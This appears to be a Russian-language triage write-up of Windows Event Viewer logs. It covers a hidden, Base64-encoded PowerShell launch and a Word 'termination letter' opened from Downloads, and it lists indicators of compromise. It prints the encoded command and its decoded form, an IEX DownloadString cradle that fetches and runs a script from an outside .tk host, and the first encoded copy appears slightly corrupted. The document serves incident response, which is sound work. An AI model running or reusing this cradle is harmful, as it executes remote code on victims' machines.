Данный вывод из Event Viewer содержит подозрительные действия, связанные с использованием PowerShell и запуском документа Microsoft Word. Давайте разберем его подробно.

---

### 1. **Подозрительный запуск PowerShell**

Строка:

"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Nop -sta -noni -w hidden -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBvAG0AbgBpAC0AYwBvAG4AcwB1AG0AZQByAC0AcAByADAAZAB1AGMAdABzAC4AdABrAC8AZgBhAHYAaQBjAG8AbgAuAGkAYwBvACcAKQA7AA==

#### Анализ:

- **Параметры запуска PowerShell**:
    
    - `-Nop`: Отключает загрузку профиля PowerShell.
        
    - `-sta`: Запускает PowerShell в однопоточном режиме.
        
    - `-noni`: Запускает PowerShell в неинтерактивном режиме.
        
    - `-w hidden`: Скрывает окно PowerShell.
        
    - `-encodedCommand`: Выполняет команду, закодированную в Base64.
        
- **Декодирование команды**:  
    Закодированная команда:
    
    SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBvAG0AbgBpAC0AYwBvAG4AcwB1AG0AZQByAC0AcAByADAAZAB1AGMAdABzAC4AdABrAC8AZgBhAHYAaQBjAG8AbgAuAGkAYwBvACcAKQA7AA==
    
    После декодирования:
    
    Copy
    
    IEX (New-Object System.Net.WebClient).DownloadString('http://omni-consumer-pr0ducts.tk/favicon.ico');
    
    Эта команда использует `Invoke-Expression (IEX)` для загрузки и выполнения скрипта с удаленного сервера.
    

#### Подозрительные признаки:

- Использование `-encodedCommand` для скрытия команды.
    
- Загрузка и выполнение скрипта с удаленного сервера (`http://omni-consumer-pr0ducts.tk/favicon.ico`).
    
- Скрытие окна PowerShell (`-w hidden`).
    

#### IoC:

- **URL**: `http://omni-consumer-pr0ducts.tk/favicon.ico`
    
- **Хэши файлов**:
    
    - MD5: `83767E18DB29B51A804A9E312D0ED99C`
        
    - SHA256: `1EE3D7C80D075D64F97D04D036E558043F2F6BC959C87CD5B0A6D53B96B96A0F`
        
    - IMPHASH: `D1A922C94A1F407CB2BBCAD033C8ED7A`
        

---

### 2. **Запуск Microsoft Word**

Строка:

Copy

"C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE" /n "C:\Users\user\Downloads\employee termination letter.docx"

#### Анализ:

- Документ `employee termination letter.docx` был открыт из папки `C:\Users\user\Downloads\`.
    
- Это может быть попытка использования уязвимости в Microsoft Word (например, макросов или эксплойтов).
    

#### Подозрительные признаки:

- Документ загружен из папки `Downloads`, что может указывать на внешний источник.
    
- Если документ содержит макросы или эксплойты, это может быть частью атаки.
    

#### IoC:

- **Имя файла**: `employee termination letter.docx`
    
- **Путь**: `C:\Users\user\Downloads\employee termination letter.docx`
    

---

### 3. **Общий анализ**

- **Цель атаки**: Вероятно, это попытка загрузки и выполнения вредоносного кода через PowerShell.
    
- **Метод**: Использование закодированной команды PowerShell для скрытия действий и загрузки скрипта с удаленного сервера.
    
- **Дополнительные действия**: Открытие документа Word может быть частью фишинговой атаки или попыткой эксплуатации уязвимости.